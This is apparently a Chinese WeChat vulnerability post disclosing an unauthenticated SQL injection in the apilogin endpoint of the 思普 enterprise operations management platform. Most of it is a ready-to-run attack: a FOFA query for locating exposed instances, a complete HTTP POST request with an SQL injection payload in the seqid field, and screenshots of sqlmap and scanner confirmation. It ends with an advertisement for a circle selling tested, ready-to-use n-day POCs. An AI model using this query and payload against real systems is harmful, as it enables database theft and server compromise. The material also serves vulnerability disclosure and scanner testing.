#  思普企业运营管理平台 apilogin SQL注入漏洞   
Superhero  nday POC   2024-12-13 03:21  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
思普企业运营管理平台是一款专为企业提供全方位运营管理解决方案的软件平台，旨在帮助企业实现运营流程的可视化  
、自动化和协同化管理，提升运营效率和管理水平。平台集成了多个功能模块，包括人力资源管理、财务管理、供应链管理、销售管理、项目管理等，通过集成各个部门功能模块，形成企业运营管理的全面解决方案。企业可以根据实际需求选择安装相应的模块，实现企业内部各个环节的协同管理。  
  
  
**01******  
  
**漏洞概述**  
  
  
思普企业运营管理平台 apilogin 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
icon_hash="-403479360"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJWecEl1qP3ULlkPryWvc8kkG8icicO1PmEJt4hTpqqKuP3SHtKsfeNvgEsl05TKbBqiaGg1Go3Dbnow/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /IdsCenter/idsCheck?p=apilogin HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
X-Requested-With: XMLHttpRequest

seqid=1%27+AND+6884+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%286884%3D6884%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29--+cxaC&datasource=EOMP1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJWecEl1qP3ULlkPryWvc8kG0wuSd3J2yaW4QGdicxvG4ArnCBEgw2wAZJOhLaf0MPkgeIQLOk5J7w/640?wx_fmt=png&from=appmsg "")  
  
sqlmap验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJWecEl1qP3ULlkPryWvc8kmA5ufiaHbl8x6lHHtCoicrXxHuhEg38kLJ5qYyL979eYhBOhR0jVw60w/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJWecEl1qP3ULlkPryWvc8knJPkk0OTiary2tJDbRw8Or3YpMOaIHk4mTUs5EibxKRyS9wL5iaEz2dPg/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJWecEl1qP3ULlkPryWvc8kwqcQHbZDpI2RbdjLl7p2RiaesImI52ia4GBmsjJgAibycP6W51Q4aCKibQ/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJWecEl1qP3ULlkPryWvc8k9vXFg0DZWxibCOxrOrnVOnDtbec99MibR7iaqTqd8diaxibxSmaGSsn7xRw/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
